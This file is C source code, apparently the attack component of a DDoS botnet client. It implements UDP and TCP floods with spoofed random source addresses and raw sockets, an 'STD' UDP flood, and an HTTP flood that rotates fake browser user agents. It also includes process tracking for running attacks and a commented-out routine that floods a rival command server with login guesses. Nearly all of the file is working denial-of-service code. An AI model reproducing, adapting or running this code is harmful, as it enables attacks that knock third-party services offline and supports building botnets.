#include "includes.h"

uint32_t scanPid;
uint32_t *attackpids;
uint64_t numattackpids = 0;

#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct in_addr ourIP;

char *UserAgents[] = {
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5"
};

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};

in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
	char buf[20];
};
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        int totaltcp_len = sizeof(struct tcp_pseudo);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
	char *pre;
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}

void udpflood(unsigned char *target, int port, int timeEnd, int packetsize)
{
		int pollinterval = 10;
		int spoofit = 32;
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
#ifdef DEBUG
	                    printf("Failed opening raw socket.\n");
#endif
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
#ifdef DEBUG
                        printf("Failed opening raw socket.\n");
#endif
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
#ifdef DEBUG
                        printf("Failed setting raw headers mode.\n");
#endif
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
#ifdef DEBUG
				printf("UDP Flooding %s:%d (%d Seconds / %d Packetsize)\n", target, port, timeEnd, packetsize);
#endif
                while(1)
                {
                    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                    udph->source = rand_cmwc();
                    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                    iph->id = rand_cmwc();
                    iph->saddr = htonl( getRandomIP(netmask) );
                    iph->check = csum ((unsigned short *) packet, iph->tot_len);

                    if(i == pollRegister)
                    {
                            if(time(NULL) > end) break;
                            i = 0;
                            continue;
                    }
                    i++;
                }
        }
#ifdef DEBUG
				printf("UDP Flood on (%s:%d) finished!\n", target, port);
#endif
}

void tcpflood(unsigned char *target, int port, int timeEnd, int packetsize, unsigned char *flags)
{
		int spoofit = 32;
		int pollinterval = 10;
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
#ifdef DEBUG
                printf("Failed opening raw socket.\n");
#endif
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
#ifdef DEBUG
                printf("Failed setting raw headers mode.\n");
#endif
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                                printf("Invalid flag \"%s\"\n", pch);
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
#ifdef DEBUG
				printf("TCP Flooding %s:%d (%d Seconds / %d Packetsize / %s Flags)\n", target, port, timeEnd, packetsize, flags);
#endif
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
#ifdef DEBUG
				printf("TCP Flood on (%s:%d) finished!\n", target, port);
#endif
}

void stdflood(unsigned char *ip, int port, int secs, int packetsize)
{
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
#ifdef DEBUG
	printf("STD Flooding %s:%d (%d Seconds / %d Packetsize)\n", ip, port, secs, packetsize);
#endif
    while(1){
        if (a >= 50) 
        {
			char *deresdatboi = makestring();
            send(iSTD_Sock, deresdatboi, packetsize, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                close(iSTD_Sock);
				_exit(0);
            }
            a = 0;
        }
        a++;
    }
#ifdef DEBUG
	printf("STD Flood on (%s:%d) finished!\n", ip, port);
#endif
}

int socket_connect(char *host, in_port_t port){
        struct hostent *hp;
        struct sockaddr_in addr;
        int on = 1, sock;     

        if((hp = gethostbyname(host)) == NULL){
                herror("gethostbyname");
                exit(1);
        }
        bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

        if(sock == -1){
                perror("setsockopt");
                exit(1);
        }
        
        if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
                perror("connect");
                exit(1);

        }
        return sock;
}

void httpflood(char *method, char *host, in_port_t port, char *path, int timeEnd, int threads)
{
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1];
	for (i = 0; i < threads; i++)
	{
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, UserAgents[(rand() % 39)]);
		while (end > time(NULL))
		{
			socket = socket_connect(host, port);
			if (socket != 0)
			{
				write(socket, request, strlen(request));
				read(socket, buffer, 1);
				close(socket);
			}
		}
		exit(0);
	}
}

/*void c2flood(char *c2host, int c2port, int seconds, int threads)
{
	int C2 = -1;
	int i, end, k;
	char buffer[1024];
	char *usernames[] = {"\n", "admin\n", "root\n", "lame\n"};
	char *passwords[] = {"\n", "root\n", "lame\n"};
	struct sockaddr_in sock;
	end = time(NULL) + seconds;
	C2 = socket(AF_INET, SOCK_STREAM, 0);
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(c2host);
	sock.sin_port = htons(c2port);
	for(i=0; i < threads; i++)
	{
		connect(C2, (struct sockaddr *)&sock, sizeof(sock));
		while(end > time(NULL))
		{
			write(C2, usernames[rand() % 3], strlen(usernames[rand() % 3]));
			usleep(0.3);
			k = read(C2, buffer, 1024);
			buffer[k] = '\0';
			if(strstr(buffer, "assword") || strstr(buffer, "sername") || strstr(buffer, "ser"))
				write(C2, passwords[1], strlen(passwords[1]));
			else
				write(C2, passwords[rand() % 2], strlen(passwords[rand() % 2]));
			close(C2);
		}
#ifdef DEBUG
	printf("C2-Flood On %s:%d Finished!\n", c2host, c2port);
#endif
	}
}*/

int listFork()
{
        uint32_t parent, *newattackpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numattackpids++;
        newattackpids = (uint32_t*)malloc((numattackpids + 1) * 4);
        for (i = 0; i < numattackpids - 1; i++) newattackpids[i] = attackpids[i];
        newattackpids[numattackpids - 1] = parent;
        free(attackpids);
        attackpids = newattackpids;
        return parent;
}

void stop_attack(void)
{
    int killed = 0;
    unsigned long i;

    for (i = 0; i < numattackpids; i++)
    {
        if (attackpids[i] != 0 && attackpids[i] != getpid())
        {
            kill(attackpids[i], 9);
            killed++;
        }
    }

#ifdef DEBUG
    if (killed > 0)
        printf("Killed %d Attacks\n", killed);
    else
        printf("Killed 0 Attacks\n");
#endif
}
